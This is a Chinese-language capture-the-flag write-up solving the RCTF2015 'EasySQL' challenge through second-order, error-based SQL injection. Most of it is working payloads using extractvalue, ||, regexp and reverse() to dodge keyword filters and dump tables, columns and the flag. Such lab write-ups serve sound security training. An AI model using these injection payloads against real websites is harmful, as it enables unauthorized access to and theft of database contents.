## [RCTF2015]EasySQL

打开后发现一个登录注册页面，我们先注册一个：

![image-20230330203914744](https://s2.loli.net/2023/03/30/oMly2N1LC5k38hj.png)

我们发现有一个改密码的地方：

![image-20230330203941627](https://s2.loli.net/2023/03/30/3y7OQ2qGdJZcAvz.png)

因为这题提示sql，并且注册时存在一些特殊字符不给注册，我们猜测这应该是二次注入

我们注册一个账号：

![image-20230330204129383](https://s2.loli.net/2023/03/30/QeEHuIWyPvkUx6V.png)

当我们修改密码时：

![image-20230330204223055](https://s2.loli.net/2023/03/30/5yLxPnNhBIWYAzH.png)

发现报错了，于是我们推测，sql语句如下：

```sql
select * from table where username="1"" and pwd = '202cb962ac59075b964b07152d234b70'
```

所以我们需要注册时，在用户名处进行sql注入，然后修改密码时报错回显。我们应该使用报错注入

经过测试，空格等被过滤了。我们需要绕过，可以使用()、||



查询表名：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e))#
```

![image-20230330210235007](https://s2.loli.net/2023/03/30/Xh6fPLtK9Hkd1WI.png)

查询字段名：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e))#
```

![image-20230330210347837](https://s2.loli.net/2023/03/30/VGJ1mKYNugzQp7n.png)

查询数据：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(flag))from(flag)),0x7e))#
```

![image-20230330210525752](https://s2.loli.net/2023/03/30/8ZVyCAoR4XfHJQr.png)

查询出来了一部分，但是没有显示完全，并且说flag不在这里，

于是我们查询users表

查字段：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e))#
```

![image-20230330211039997](https://s2.loli.net/2023/03/30/ZmEIkTgtzr4OhpV.png)

我们想查看完整字段，但是过滤了：left、right、mid函数

我们可以使用正则匹配：（不能使用like，被过滤了）

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&((column_name)regexp('^re'))),0x7e))#
```

![image-20230330211613972](https://s2.loli.net/2023/03/30/WsHr84xCuObweoE.png)

查看到字段名：`real_flag_1s_here`

然后我们去查数据：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e))#
```

![image-20230330212218279](https://s2.loli.net/2023/03/30/UsF14vo9EBkK8Jf.png)

查到一堆乱七八糟的，我们还是使用正则：

```sql
"||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f')),0x7e))#
```

![image-20230330212335501](https://s2.loli.net/2023/03/30/8O9Ka2csA41tQkd.png)

只查到一部分，怎么查另一半呢？这里使用一个函数：`reverse()`

```sql
"||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),0x7e))#
```

![image-20230330212800205](https://s2.loli.net/2023/03/30/Jj2ytAVzKxf5uPN.png)

成功查到另一半

